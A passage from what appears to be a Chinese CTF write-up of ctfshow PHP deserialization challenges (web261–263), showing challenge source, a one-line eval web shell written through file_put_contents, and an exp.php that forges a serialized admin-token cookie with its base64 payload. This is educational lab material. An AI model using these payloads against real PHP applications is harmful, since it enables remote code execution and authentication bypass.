operator\">-></span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token operator\">==</span><span class=\"token number\">0x36d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这题主要考察魔术方法的应用，</p>\n<p><code>__construct</code>  为构造方法，</p>\n<p><code>__wakeup</code>  准备对象资源，</p>\n<p><code>__invoke</code>  当尝试以调用函数的方式调用一个对象时， <code>__invoke()</code>  方法会被自动调用。</p>\n<p><code>__sleep()</code>  方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p>\n<p><code>__unserialize</code>  反序列化调用的方法</p>\n<p><code>__destruct</code>  析构方法</p>\n<p>而如果类中同时定义了 <code>__unserialize</code>  和 <code>__wakeup()</code>  两个魔术方法，则只有 <code>__unserialize()</code>  方法会生效， <code>__wakeup()</code>  方法会被忽略。</p>\n<p>而在代码中，我们必然只能调用 <code>__unserialize</code>  和 <code>__destruct</code>  两个方法</p>\n<p>其中 <code>__destruct</code>  中由 <code>file_put_contents</code>  可以想到写一句话到文件里，其只需要 <code>$this-&gt;code==0x36d</code>  即可</p>\n<p>观察到为 <code>==</code>  即若等于，那么可以弄出 <code>877.phpxxx==0x36d</code> ，即控制了文件名，而内容为一句话，也可以控制</p>\n<p>观察到反序列化中均可控，那么可以使 <code>$username='877.php'</code> , <code>$password='&lt;?php eval($_POST[1]);?&gt;'</code></p>\n<p>即可成功写入一句话，之后正常 rce 即可</p>\n<h1 id=\"web262\"><a class=\"anchor\" href=\"#web262\">#</a> web262</h1>\n<p>源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-03 02:37:19</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-03 16:05:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @message.php</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$umsg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$umsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your message has been sent'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>进入后发现并没有提供 flag 的地方，从头阅读源码，可以看到最上面注释有 <code>message.php</code> ，访问，得到</p>\n<p>message.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-03 15:13:03</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-03 15:17:17</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>阅读代码，可知只需构造一个 message 类，token 为 <code>admin</code>  即可，故 exp.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>payload: <code>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIxIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></p>\n<p>设置 cookie 的 msg 为此值，得到 flag</p>\n<h1 id=\"web-263\"><a class=\"anchor\" href=\"#web-263\">#</a> web 263</h1>\n<p>进入后是一个登陆界面，看似为 sql 注入，实则不是</p>\n<p>url 输入 <code>www.zip</code>  可以下载题目的源码，可以看到如下文件结构</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web263_1.jpg\" alt=\"\" /></p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 16:28:37</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:21:45</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// 超过 5 次禁止登陆</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limti'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token number\">5</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登陆失败次数超过限制\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"limit\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>check.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 16:59:10</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:15:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string single-quoted-string\">'inc/inc.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$GET</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"u\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"pass\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token variable\">$data</span><span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">[</span>\t<span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'UserName0'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"AND\"</span><span class=\"token operator\">=></span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"UserName0[=]\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"PassWord1[=]\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">// 密码必须为 128 位大小写字母 + 数字 + 特殊符号，防止爆破</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token 